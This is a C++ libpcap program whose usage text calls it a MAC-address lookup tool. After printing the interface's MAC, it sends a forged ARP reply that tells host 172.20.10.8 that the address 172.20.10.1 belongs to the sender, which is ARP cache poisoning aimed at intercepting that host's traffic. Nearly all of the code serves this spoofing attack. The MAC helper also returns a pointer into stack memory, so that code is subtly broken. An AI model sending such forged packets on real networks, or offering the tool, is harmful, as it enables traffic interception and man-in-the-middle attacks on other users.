#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: get-mac-address <interface>\n");
	printf("sample: get-mac-address wlan0\n");
}

// Function to get the MAC address
unsigned char* getMAC(char *iface) {
	int fd;
	struct ifreq ifr;
	unsigned char *mac = NULL;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0) {
		perror("Cannot open socket");
		return NULL;
	}

	strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl");
		return NULL;
	}

	mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;

	close(fd);

	return mac;
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	// Get the MAC address of the interface and print it
	unsigned char* mymac = getMAC(argv[1]);
	if(mymac != NULL) {
		printf("MAC Address of %s: %02X:%02X:%02X:%02X:%02X:%02X\n", argv[1], mymac[0],mymac[1], mymac[2], mymac[3], mymac[4], mymac[5]);
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(mymac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(mymac);
	packet.arp_.sip_ = htonl(Ip("172.20.10.1"));
	packet.arp_.tmac_ = Mac("58-1c-f8-f4-22-a2");
	packet.arp_.tip_ = htonl(Ip("172.20.10.8"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
	return 0;
}

